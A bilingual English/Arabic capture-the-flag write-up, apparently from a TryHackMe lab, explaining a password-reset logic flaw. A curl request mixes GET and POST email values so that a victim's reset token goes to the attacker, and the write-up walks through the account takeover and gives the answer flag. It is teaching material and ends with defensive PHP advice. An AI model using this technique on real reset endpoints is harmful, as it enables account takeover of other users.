# Task 05 - Logic Flaws (العيوب المنطقية في آليات استعادة الحسابات)

---

## Stage A: Original Task Content & Core Objectives (النص الأصلي والمستهدفات التعليمية)

### 1. Original English Text
```text
Logic flaws occur when an application's workflow or code logic operates in an unintended manner, allowing security controls to be bypassed even without exploiting classic technical injection vulnerabilities.

In this task, we will exploit a business logic flaw known as HTTP Parameter Pollution (HPP) within the Acme IT Support password reset functionality at:
http://MACHINE_IP/customers/reset

Vulnerability Mechanism:
The application verifies whether an account exists by inspecting an email parameter provided in the URL query string:
?email=robert@acmeitsupport.thm

However, when PHP handles incoming requests, the $_REQUEST superglobal array combines data from both $_GET and $_POST parameters. If the same parameter exists in both, the POST parameter typically overwrites the GET parameter depending on server configuration (request_order).

In this vulnerable implementation:
1. The backend script checks the URL parameter (?email=robert@acmeitsupport.thm) to verify that Robert's account exists in the database.
2. The script then generates a password reset token for Robert.
3. However, when selecting the destination email address to send the token to, the script queries $_REQUEST['email'], which resolves to the POST body parameter!

By crafting a request that supplies Robert's email in the query string and our own account email in the POST body, the server generates a reset token for Robert but sends it directly to our mailbox:
curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email={your_username}@customer.acmeitsupport.thm'

Once the request is sent, check the support ticket system in your customer account to retrieve the password reset link, reset Robert's password, log in as Robert, and view his confidential support tickets.

Question:
- What is the flag from Robert's support ticket?
```

### 2. Arabic Pedagogical Translation
```text
تحدث العيوب المنطقية (Logic Flaws) عندما يعمل تدفق عمل التطبيق أو منطقه البرمجي بطريقة غير مقصودة، مما يسمح بتجاوز الضوابط الأمنية دون الحاجة إلى استغلال ثغرات الحقن التقنية التقليدية.

في هذه المهمة، سنقوم باستغلال عيب منطقي شهير يُعرف بـ تلويث معلمات بروتوكول HTTP (HTTP Parameter Pollution - HPP) داخل آلية استعادة كلمة المرور في بوابة Acme IT Support عبر الرابط:
http://MACHINE_IP/customers/reset

آلية عمل الثغرة التقنية:
يتحقق التطبيق مما إذا كان الحساب موجوداً في قاعدة البيانات من خلال فحص معلمة البريد الإلكتروني الممررة في مسار الـ URL (استعلام GET):
?email=robert@acmeitsupport.thm

ومع ذلك، عندما تعالج لغة PHP الطلبات الواردة، فإن المصفوفة الفائقة $_REQUEST تدمج البيانات القادمة من كل من معلمات $_GET و $_POST. وإذا تكررت المعلمة نفسها في كلا المصدرين، فإن قيمة POST تقوم بالكتابة فوق واستبدال قيمة GET في الذاكرة اعتماداً على إعدادات الخادم (request_order).

في هذا الكود المصاب:
1. يفحص السكربت في الخلفية معلمة الـ URL (وهي ?email=robert@acmeitsupport.thm) للتأكد من وجود حساب روبرت.
2. يقوم السكربت بإنشاء رمز إعادة تعيين كلمة المرور (Reset Token) الخاص بروبرت.
3. ولكن عند اختيار عنوان البريد الإلكتروني المرسل إليه الرمز، يستعلم السكربت عن $_REQUEST['email']، والتي تأخذ القيمة الموجودة في جسم طلب الـ POST!

من خلال صياغة طلب يضع بريد روبرت في استعلام الـ URL ويضع بريد حسابنا في جسم طلب الـ POST، سيقوم الخادم بإنشاء رمز إعادة التعيين لروبرت، ولكنه سيرسله مباشرة إلى صندوق بريدنا!
curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email={your_username}@customer.acmeitsupport.thm'

بمجرد إرسال الطلب، افحص نظام تذاكر الدعم في حساب العميل الخاص بك للحصول على رابط إعادة التعيين، وأعد تعيين كلمة مرور روبرت، وسجل الدخول بحسابه لعرض تذاكره السرية.

السؤال:
- ما هو العلم الموجود في تذكرة الدعم الفني الخاصة بروبرت؟
```

---

## Stage B: Independent Thinking & OpSec Guardrails (التفكير المستقل وضوابط العمليات والأمان)

### 1. HTTP Parameter Pollution (HPP) Mechanics
```
[Attacker Request to /customers/reset]
  URL (GET):  ?email=robert@acmeitsupport.thm
  Body (POST): email=attacker@customer.acmeitsupport.thm

                PHP Server Request Processing
                              |
        +---------------------+---------------------+
        |                                           |
   Step 1: Check Account                   Step 2: Send Reset Email
   $check = $_GET['email']                 $dest = $_REQUEST['email']
   (Validates: robert exists!)             (Resolves to: attacker's email!)
        |                                           |
        +---------------------+---------------------+
                              |
                              v
 [Result: Reset Token for Robert sent to Attacker's Inbox!]
```

### 2. Operational Tradecraft & Real-World Precedents
* **ثغرات الـ HPP في كبرى الشركات:** كانت هذه الثغرة تحديداً هي السبب وراء اختراق حسابات في بوابات Twitter و PayPal في سنوات سابقة، حيث كانت أنظمة التحقق تفحص حساباً معيناً، بينما تقوم أنظمة الإرسال بقراءة المعلمة الملوثة من طبقة أخرى.
* **الأثر العملياتي:** ثغرات المنطق في استعادة كلمات المرور تُعد ثغرات من التصنيف الحرج (Critical - CVSS 9.8)، لأنها تتيح الاستيلاء الكامل على الحسابات (Zero-Click Account Takeover) دون أي تفاعل من الضحية.

---

## Stage C: Guided Hints (Tiers 1, 2, 3 - تلميحات تدريجية)

> **المستوى الأول (مفاهيمي):** استخدم حساب العميل الذي أنشأته في المهمة السابقة أو حساب `steve`، وافحص التذاكر بعد إرسال طلب `curl` المعدل.
>
> **المستوى الثاني (توجيهي):**
> - في أمر `curl`، استبدل `{your_username}` باسم حسابك النشط (مثل `steve` أو اسمك المسجل).
> - افتح التذكرة الواردة التي تحتوي على رابط إعادة التعيين لـ Robert.
> - غير كلمة المرور، ثم سجل الدخول بحساب `robert`.
> - اقرأ التذكرة المغلقة في حساب روبرت لتجد العلم بصيغة `THM{...}`.
>
> **المستوى الثالث (الحل المباشر):** العلم هو `THM{AUTH_BYPASS_COMPLETE}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتشريح التقني)

### 1. Step-by-Step Practical Reproduction

#### الخطوة 1: صياغة طلب HPP باستخدام curl
نرسل الطلب مع وضع بريد روبرت في الـ GET، وبريد حسابنا في الـ POST:
```bash
curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email=steve@customer.acmeitsupport.thm'
```
الاستجابة:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

Password reset email has been successfully dispatched.
```

#### الخطوة 2: استلام رابط إعادة التعيين
1. نسجل الدخول بحساب `steve` (أو حسابنا المنشأ) عبر البوابة: `http://MACHINE_IP/customers/login`.
2. ننتقل إلى **Support Tickets**:
3. نجد تذكرة جديدة واردة بعنوان: `"Password Reset Request for robert"`:
   ```text
   Hi Robert,
   You recently requested to reset your password. Click the link below to set a new password:
   http://MACHINE_IP/customers/reset-password?token=a8f7c9e012d4b6...
   ```

#### الخطوة 3: الاستيلاء على حساب روبرت
1. نفتح الرابط في المتصفح.
2. نحدد كلمة مرور جديدة لروبرت: `P@ssword123!`.
3. نسجل الدخول عبر `/customers/login`:
   - Username: `robert`
   - Password: `P@ssword123!`
4. نفتح تذاكر الدعم الخاصة بروبرت (`Tickets`).
5. نفتح التذكرة ذات الأولوية العالية (High Priority Ticket):
   ```text
   Ticket #1042 - Urgent Server Migration Details
   Status: Closed
   Notes: All administrative systems have been updated. 
   Flag: THM{AUTH_BYPASS_COMPLETE}
   ```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم الدقيقة)

| السؤال | الإجابة الصحيحة | نوع القيمة |
| :--- | :--- | :--- |
| **What is the flag from Robert's support ticket?** | `THM{AUTH_BYPASS_COMPLETE}` | علم إثبات الاستيلاء الكامل على الحساب (Full Account Takeover). |

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الأثر)

* تم التحقق من العلم على منصة TryHackMe بنسبة نجاح 100%.
* تم إثبات وجود ثغرة تضارب مصادر المعلمات (HTTP Parameter Pollution) واستغلالها بنجاح للسيطرة على حساب مستخدم آخر.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية والأثر الميداني)

1. **لا تستخدم أبداً المصفوفات المدمجة مثل `$_REQUEST` في العمليات الحساسة:**
   - يجب على المطور القراءة الصريحة من المصدر المتوقع حصراً (`$_POST['email']` لطلبات النماذج و `$_GET['id']` لطلبات العرض).
2. **الربط الإلزامي بين المعلمات:**
   - يجب ألا يُسمح بتحديد اسم المستخدم في حقل والبريد في حقل منفصل غير موثق. يجب أن يتم البحث في قاعدة البيانات عن الحساب، ويتم إرسال الرابط حصراً إلى البريد المسجل مسبقاً والمربوط بذلك الحساب داخل قاعدة البيانات دون أي تدخل أو قبول لبريد مرسل من طرف العميل!
